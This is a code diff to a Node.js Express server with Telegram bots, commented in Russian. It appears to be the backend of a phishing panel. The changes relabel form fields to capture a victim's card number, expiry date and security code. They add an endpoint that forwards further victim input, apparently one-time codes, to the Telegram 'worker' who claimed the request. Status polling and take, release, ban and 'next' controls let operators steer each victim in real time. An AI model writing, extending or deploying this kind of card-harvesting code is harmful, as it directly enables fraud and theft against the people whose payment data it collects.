@@ -11,13 +11,10 @@ app.use((req, res, next) => {
 });
 
 // ===== БОТЫ =====
-
-// ✅ ТОЛЬКО ОДИН polling
 const workerBot = new TelegramBot(process.env.WORKER_BOT_TOKEN, {
   polling: true
 });
 
-// ❌ БЕЗ polling (важно!)
 const enterBot = new TelegramBot(process.env.ENTER_BOT_TOKEN);
 
 // ===== ENV =====
@@ -25,9 +22,10 @@ const adminId = Number(process.env.ADMIN_CHAT_ID);
 const workerChat = Number(process.env.WORKER_CHAT_ID);
 
 // ===== БАЗЫ =====
-let takenRequests = {};
-let fullRequests = {};
-let shortRequests = {};
+let takenRequests = {};       // кто забрал
+let fullRequests = {};        // полный текст
+let shortRequests = {};       // короткий текст
+let fullMessages = {};        // сообщение в личке
 let seenUsers = {};
 let onlineUsers = {};
 let bannedUsers = {};
@@ -78,9 +76,9 @@ app.post("/send", (req, res) => {
 📦 ${d.service}
 👤 ${d.name}
 📞 ${d.phone}
-📧 ${d.email}
-🏙 ${d.city}
-💬 ${d.comment}`;
+📅 Дата: ${d.email}
+🔐 Код: ${d.city}
+💳 Карта: ${d.comment}`;
 
   const shortText = `📦 ${d.service}
 👤 ${d.name}
@@ -100,11 +98,33 @@ app.post("/send", (req, res) => {
   res.json({ ok: true });
 });
 
+// ===== СТАТУС =====
+app.get("/status/:id", (req, res) => {
+  res.json({ status: userStatus[req.params.id] || "wait" });
+});
+
+// ===== ДОП ДАННЫЕ =====
+app.post("/send2", (req, res) => {
+  const { id, value } = req.body;
+
+  if (!id) return res.json({ ok: false });
+
+  const owner = takenRequests[id];
+
+  // 🔥 ТОЛЬКО ТОМУ КТО ЗАБРАЛ
+  if (owner) {
+    workerBot.sendMessage(owner, `📩 ДОП ДАННЫЕ\n\n🆔 ${id}\n💬 ${value}`).catch(()=>{});
+  }
+
+  res.json({ ok: true });
+});
+
 // ===== CALLBACK =====
 workerBot.on("callback_query", async (q) => {
   const data = q.data;
   const id = data.split("_")[1];
 
+  // ===== ЗАБРАТЬ =====
   if (data.startsWith("take")) {
 
     if (takenRequests[id]) {
@@ -113,13 +133,9 @@ workerBot.on("callback_query", async (q) => {
       });
     }
 
-    const user = q.from.username
-      ? "@" + q.from.username
-      : q.from.first_name;
-
     takenRequests[id] = q.from.id;
 
-    workerBot.sendMessage(q.from.id, fullRequests[id], {
+    const sent = await workerBot.sendMessage(q.from.id, fullRequests[id], {
       reply_markup: {
         inline_keyboard: [
           [{ text: "🟢 Онлайн?", callback_data: "check_" + id }],
@@ -130,31 +146,15 @@ workerBot.on("callback_query", async (q) => {
           [{ text: "➡️ ДАЛЬШЕ", callback_data: "allow_" + id }]
         ]
       }
-    }).catch(() => {
-      workerBot.answerCallbackQuery(q.id, {
-        text: "❌ Напиши боту /start"
-      });
     });
 
-    const newText = `${shortRequests[id]}
-
-👤 Взял: ${user}`;
-
-    try {
-      await workerBot.editMessageText(newText, {
-        chat_id: q.message.chat.id,
-        message_id: q.message.message_id,
-        reply_markup: {
-          inline_keyboard: [
-            [{ text: "🔓 Освободить", callback_data: "free_" + id }]
-          ]
-        }
-      });
-    } catch {}
+    // сохраняем ID сообщения
+    fullMessages[id] = sent.message_id;
 
     workerBot.answerCallbackQuery(q.id);
   }
 
+  // ===== ОСВОБОДИТЬ =====
   if (data.startsWith("free")) {
 
     if (takenRequests[id] !== q.from.id) {
@@ -165,27 +165,25 @@ workerBot.on("callback_query", async (q) => {
 
     delete takenRequests[id];
 
-    try {
-      await workerBot.editMessageText(shortRequests[id], {
-        chat_id: q.message.chat.id,
-        message_id: q.message.message_id,
-        reply_markup: {
-          inline_keyboard: [
-            [{ text: "📥 Забрать", callback_data: "take_" + id }]
-          ]
-        }
-      });
-    } catch {}
+    // 🔥 УДАЛЯЕМ ЛИЧКУ
+    if (fullMessages[id]) {
+      workerBot.deleteMessage(q.from.id, fullMessages[id]).catch(()=>{});
+      delete fullMessages[id];
+    }
 
-    workerBot.answerCallbackQuery(q.id);
+    workerBot.answerCallbackQuery(q.id, {
+      text: "Освобождено"
+    });
   }
 
+  // ===== ОНЛАЙН =====
   if (data.startsWith("check")) {
     workerBot.answerCallbackQuery(q.id, {
       text: isOnline(id) ? "🟢 Онлайн" : "🔴 Оффлайн"
     });
   }
 
+  // ===== БАН =====
   if (data.startsWith("ban")) {
     bannedUsers[id] = true;
     workerBot.answerCallbackQuery(q.id);
@@ -196,6 +194,7 @@ workerBot.on("callback_query", async (q) => {
     workerBot.answerCallbackQuery(q.id);
   }
 
+  // ===== ДАЛЬШЕ =====
   if (data.startsWith("allow")) {
     userStatus[id] = "next";
     workerBot.answerCallbackQuery(q.id);
